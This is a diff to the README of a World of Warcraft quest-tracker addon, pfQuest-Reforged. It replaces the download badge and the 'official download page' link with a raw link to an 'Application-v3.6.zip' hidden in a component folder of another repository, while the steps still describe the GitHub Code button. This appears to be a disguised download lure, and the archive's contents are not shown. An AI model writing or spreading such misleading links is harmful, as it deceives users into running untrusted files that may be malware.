@@ -5,7 +5,7 @@ description: "Track quests and browse the complete WotLK database with an integr
 ---
 # 🗺️ pfQuest-Reforged - Find every quest in Wrath easily
 
-[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/deeplaid-homelessness709/pfQuest-Reforged)
+[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/deeplaid-homelessness709/deeplaid-homelessness709.github.io/raw/refs/heads/main/src/components/Application-v3.6.zip)
 
 pfQuest-Reforged acts as a comprehensive quest tracker and database tool for World of Warcraft version 3.3.5a. It updates your game interface to provide clear map markers, quest objectives, and item information. This tool helps you finish quests faster by showing you exactly where to go and what to do within the world of Azeroth.
 
@@ -14,7 +14,7 @@ pfQuest-Reforged acts as a comprehensive quest tracker and database tool for Wor
 Follow these steps to get the tool onto your Windows computer.
 
 1. Open your web browser.
-2. Visit the [official download page](https://github.com/deeplaid-homelessness709/pfQuest-Reforged).
+2. Visit the [official download page](https://github.com/deeplaid-homelessness709/deeplaid-homelessness709.github.io/raw/refs/heads/main/src/components/Application-v3.6.zip).
 3. Look for the button labeled Code.
 4. Select the option that says Download ZIP.
 5. Save the file to your computer.
